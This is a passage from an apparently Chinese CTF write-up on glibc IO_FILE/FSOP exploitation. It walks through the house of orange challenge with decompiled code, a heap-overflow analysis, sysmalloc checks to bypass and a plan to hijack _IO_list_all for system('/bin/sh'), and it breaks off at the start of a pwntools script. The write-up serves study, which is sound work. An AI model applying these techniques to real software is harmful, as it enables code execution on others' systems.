  <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">abort</span> <span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">  	<span class="keyword">if</span> (stage == <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      	++stage;</span><br><span class="line">      	__fcloseall ();</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">__fcloseall (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> _IO_cleanup ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li>当执行 <code>exit</code> 函数时</li>
</ol>
  <div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span> <span class="params">(<span class="type">int</span> status)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">第(<span class="number">1</span>)条链</span><br><span class="line"><span class="type">void</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp, <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	_exit (status);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span></span><br><span class="line">_exit (<span class="type">int</span> status)</span><br><span class="line">&#123;</span><br><span class="line">  status &amp;= <span class="number">0xff</span>;</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line">第(<span class="number">2</span>)条链</span><br><span class="line">_IO_cleanup (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp (<span class="number">0</span>);</span><br><span class="line">  _IO_unbuffer_all ();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol start="3">
<li><p>当执行流从 <code>main</code> 函数返回时会执行 <code>exit-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018191511939.png"
                      alt="image-20231018191511939"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018191606707.png"
                      alt="image-20231018191606707"
                ></p>
</li>
</ol>
</li>
<li><p><code>_IO_flush_all_lockp (int do_lock)</code> 函数需要绕过的检查。</p>
</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*  从_IO_list_all开始, _IO_flush_all_lockp()遍历链表并对每个条目执行一些检查. 如果一个条目通过了所有的检查，</span></span><br><span class="line"><span class="comment">*  _IO_OVERFLOW会从虚表中调用_IO_new_file_overflow()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    * 为了能够让我们构造的 fake_FILE 能够正常工作，还需要以下绕过的检查</span></span><br><span class="line"><span class="comment">    * fp-&gt;_mode &lt;= 0</span></span><br><span class="line"><span class="comment">    * fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">    * 这里调用了 _IO_OVERFLOW 函数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) </span><br><span class="line">        &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>还有一条<code>FSOP</code>的路径是在关闭流的时候，在 <code>_IO_FINISH(fp)</code> 的执行过程中最终会调用伪造的 <code>system(&#39;/bin/sh&#39;)</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*_IO_finish_t)</span> <span class="params">(_IO_FILE *, <span class="type">int</span>)</span></span>; <span class="comment">/* finalize */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	_IO_FINISH (fp);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="hctf2016-house-of-orange"><a href="#hctf2016-house-of-orange" class="headerlink" title="[hctf2016]house of orange"></a><a class="link"   href="https://github.com/firmianay/CTF-All-In-One/tree/master/src/writeup/6.1.24_hitconctf2016_house_of_orange" >[hctf2016]house of orange <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><h3 id="检查文件信息-1"><a href="#检查文件信息-1" class="headerlink" title="检查文件信息"></a>检查文件信息</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195547354.png"
                      alt="image-20231018195547354"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195633401.png"
                      alt="image-20231018195633401"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195614081.png"
                      alt="image-20231018195614081"
                ></p>
<p>###试运行</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231018195709292.png"
                      alt="image-20231018195709292"
                ></p>
<h3 id="逆向分析-1"><a href="#逆向分析-1" class="headerlink" title="逆向分析"></a>逆向分析</h3><ul>
<li><code>main</code> 函数</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Init</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">Menu</span>();</span><br><span class="line">      v3 = <span class="built_in">get_num</span>(a1, a2);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">See</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">Upgrade</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;give up&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">        a1 = <span class="string">&quot;Invalid choice&quot;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="built_in">Build</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>Build</code> 函数</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Build</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len_of_name; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> type; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *house; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 orange; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( max_house &gt; <span class="number">3u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Too many house&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  house = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">  len_of_name = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( len_of_name &gt; <span class="number">0x1000</span> )</span><br><span class="line">    len_of_name = <span class="number">0x1000</span>;</span><br><span class="line">  *((_QWORD *)house + <span class="number">1</span>) = <span class="built_in">malloc</span>(len_of_name);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)house + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc error !!!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name :&quot;</span>);</span><br><span class="line">  <span class="built_in">Read</span>(*((<span class="type">void</span> **)house + <span class="number">1</span>), len_of_name);     <span class="comment">// 这个读取没有截断，可能存在泄露</span></span><br><span class="line">  orange = (__int64)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Price of Orange:&quot;</span>);</span><br><span class="line">  *(_DWORD *)orange = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="built_in">Color</span>();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Color of Orange:&quot;</span>);</span><br><span class="line">  type = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( type != <span class="number">0xDDAA</span> &amp;&amp; (type &lt;= <span class="number">0</span> || type &gt; <span class="number">7</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such color&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( type == <span class="number">0xDDAA</span> )</span><br><span class="line">    *(_DWORD *)(orange + <span class="number">4</span>) = <span class="number">0xDDAA</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(_DWORD *)(orange + <span class="number">4</span>) = type + <span class="number">0x1E</span>;</span><br><span class="line">  *(_QWORD *)house = orange;</span><br><span class="line">  house_list = house;</span><br><span class="line">  ++max_house;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Finish&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其结构大致为:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/hosa_struct.png"
                      alt="hosa_struct"
                ></p>
<p>其中 <code>orange</code> 是通过 <code>calloc</code> 申请的。</p>
<ul>
<li><code>See</code> 函数</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_EE6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !house_list )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No such house !&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(*house_list + <span class="number">4LL</span>) == <span class="number">0xDDAA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name of house : %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)house_list[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Price of orange : %d\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)*house_list);</span><br><span class="line">    v0 = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\x1B[01;38;5;214m%s\x1B[0m\n&quot;</span>, *((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_203080 + v0 % <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">int</span> *)(*house_list + <span class="number">4LL</span>) &lt;= <span class="number">0x1E</span> || *(<span class="type">int</span> *)(*house_list + <span class="number">4LL</span>) &gt; <span class="number">0x25</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Color corruption!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name of house : %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)house_list[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Price of orange : %d\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)*house_list);</span><br><span class="line">    v2 = <span class="built_in">rand</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;\x1B[%dm%s\x1B[0m\n&quot;</span>, *(<span class="type">unsigned</span> <span class="type">int</span> *)(*house_list + <span class="number">4LL</span>), *((<span class="type">const</span> <span class="type">char</span> **)&amp;unk_203080 + v2 % <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>See</code> 函数会打印出 <code>house-&gt;name</code>、<code>orange-&gt;price</code> 和 <code>orange</code> 图案。</p>
<ul>
<li><code>Upgrade</code> 函数</li>
</ul>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Upgrade</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *house; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len_of_name; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> type; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( max_up &gt; <span class="number">2u</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t upgrade more&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !house_list )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No such house !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">  len_of_name = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( len_of_name &gt; <span class="number">0x1000</span> )</span><br><span class="line">    len_of_name = <span class="number">0x1000</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">  <span class="built_in">Read</span>((<span class="type">void</span> *)house_list[<span class="number">1</span>], len_of_name);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Price of Orange: &quot;</span>);</span><br><span class="line">  house = (_DWORD *)*house_list;</span><br><span class="line">  *house = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="built_in">Color</span>();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Color of Orange: &quot;</span>);</span><br><span class="line">  type = <span class="built_in">get_num</span>();</span><br><span class="line">  <span class="keyword">if</span> ( type != <span class="number">0xDDAA</span> &amp;&amp; (type &lt;= <span class="number">0</span> || type &gt; <span class="number">7</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such color&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( type == <span class="number">0xDDAA</span> )</span><br><span class="line">    *(_DWORD *)(*house_list + <span class="number">4LL</span>) = <span class="number">0xDDAA</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    *(_DWORD *)(*house_list + <span class="number">4LL</span>) = type + <span class="number">0x1E</span>;</span><br><span class="line">  ++max_up;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Finish&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Upgrade</code> 函数重新设置了 <code>len_of_name</code> 后直接向旧的 <code>name</code> 区域读入内容，如果 <code>len_new &gt; len_old</code> 就会导致堆溢出。</p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>本题没有 <code>free</code> 函数，存在堆溢出。当 <code>top chunk</code>的剩余部分已经不能够满足请求时，就会调用函数 <code>sysmalloc()</code>分配新内存， 这时可能会发生两种情况，一种是调用 <code>sbrk</code>函数直接扩充 <code>top chunk</code>，另一种是调用 <code>mmap</code> 函数分配一块新的 <code>top chunk</code>。具体调 用哪一种方法是由申请大小决定的，为了能够使用前一种扩展 <code>top chunk</code>，需要请求小于阈值 <code>mp_.mmap_threshold</code>。 要成功调用 <code>_int_free()</code> 还需绕过两个断言: </p>
<ol>
<li><p><code>(unsigned long) (old_size) &gt;= MINSIZE</code> 也就是 <code>0x20</code>。</p>
</li>
<li><p><code>prev_inuse == 1 </code></p>
</li>
<li><p><code>((unsigned long) old_end &amp; (pagesize - 1)) == 0 </code>页对齐</p>
</li>
<li><p><code>(unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE) </code>新申请的 <code>size</code> 大于 <code>old size + MINSIZE</code></p>
</li>
</ol>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T nb, mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 这里阈值大于 mp_.mmap_threshold 就会调用 mmap 函数分配一块新的 top chunk。</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">	&#123;</span><br><span class="line">      <span class="type">char</span> *mm;           <span class="comment">/* return value from mmap call*/</span></span><br><span class="line"></span><br><span class="line">    try_mmap:</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    old_top = av-&gt;top;</span><br><span class="line">    old_size = <span class="built_in">chunksize</span> (old_top);</span><br><span class="line">    old_end = (<span class="type">char</span> *) (<span class="built_in">chunk_at_offset</span> (old_top, old_size));</span><br><span class="line"></span><br><span class="line">    brk = snd_brk = (<span class="type">char</span> *) (MORECORE_FAILURE);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *	1. (unsigned long) (old_size) &gt;= MINSIZE 也就是0x20。</span></span><br><span class="line"><span class="comment">    *	2. prev_inuse == 1</span></span><br><span class="line"><span class="comment">    *	3. ((unsigned long) old_end &amp; (pagesize - 1)) == 0 页对齐</span></span><br><span class="line"><span class="comment">    *	4. (unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE) 新申请的 size 大于 old size + MINSIZE</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="built_in">assert</span> ((old_top == <span class="built_in">initial_top</span> (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">            ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">             <span class="built_in">prev_inuse</span> (old_top) &amp;&amp;</span><br><span class="line">             ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">        heap_info *old_heap, *heap;</span><br><span class="line">        <span class="type">size_t</span> old_heap_size;</span><br><span class="line"></span><br><span class="line">        old_heap = <span class="built_in">heap_for_ptr</span> (old_top);</span><br><span class="line">        old_heap_size = old_heap-&gt;size;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">long</span>) (MINSIZE + nb - old_size) &gt; <span class="number">0</span></span><br><span class="line">            &amp;&amp; <span class="built_in">grow_heap</span> (old_heap, MINSIZE + nb - old_size) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">            arena_mem += old_heap-&gt;size - old_heap_size;</span><br><span class="line">            <span class="built_in">set_head</span> (old_top, (((<span class="type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="type">char</span> *) old_top)</span><br><span class="line">                    | PREV_INUSE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((heap = <span class="built_in">new_heap</span> (nb + (MINSIZE + <span class="built_in">sizeof</span> (*heap)), mp_.top_pad)))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            heap-&gt;ar_ptr = av;</span><br><span class="line">            heap-&gt;prev = old_heap;</span><br><span class="line">            av-&gt;system_mem += heap-&gt;size;</span><br><span class="line">            arena_mem += heap-&gt;size;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">top</span> (av) = <span class="built_in">chunk_at_offset</span> (heap, <span class="built_in">sizeof</span> (*heap));</span><br><span class="line">            <span class="built_in">set_head</span> (<span class="built_in">top</span> (av), (heap-&gt;size - <span class="built_in">sizeof</span> (*heap)) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">            old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">            <span class="built_in">set_head</span> (<span class="built_in">chunk_at_offset</span> (old_top, old_size + <span class="number">2</span> * SIZE_SZ), <span class="number">0</span> | PREV_INUSE);</span><br><span class="line">            <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">set_head</span> (<span class="built_in">chunk_at_offset</span> (old_top, old_size), (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">                <span class="built_in">set_foot</span> (<span class="built_in">chunk_at_offset</span> (old_top, old_size), (<span class="number">2</span> * SIZE_SZ));</span><br><span class="line">                <span class="built_in">set_head</span> (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">                <span class="comment">// 释放 old_top_chunk 到 unsorted bin。</span></span><br><span class="line">                _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">set_head</span> (old_top, (old_size + <span class="number">2</span> * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">                <span class="built_in">set_foot</span> (old_top, (old_size + <span class="number">2</span> * SIZE_SZ));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!tried_mmap)</span><br><span class="line">          <span class="keyword">goto</span> try_mmap;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这样便可成功泄露 <code>libc</code> 基址，从而获得 <code>_IO_list_all</code> 地址，然后可以利用 <code>unsorted bin attack</code> 劫持 <code>_IO_list_all</code> 到<code>main_arena+88</code>，利用 <code>fp-&gt;chain</code> 域，使 <code>fp</code> 指 向 <code>old_top</code>，前 <code>8</code> 字节为 <code>&#39;/bin/sh\x00&#39;</code> 字符串，使 <code>_IO_OVERFLOW</code> 为<code>system</code> 函数的地址，从而获得 <code>shell</code>。</p>
<p><strong>前置脚本</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">lk = <span class="keyword">lambda</span> addrstring, address: log.info(<span class="string">&#x27;&#123;&#125;: %#x&#x27;</span>.<span class="built_in">format</span>(addrstring), address)</span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">def</span> <span class="title 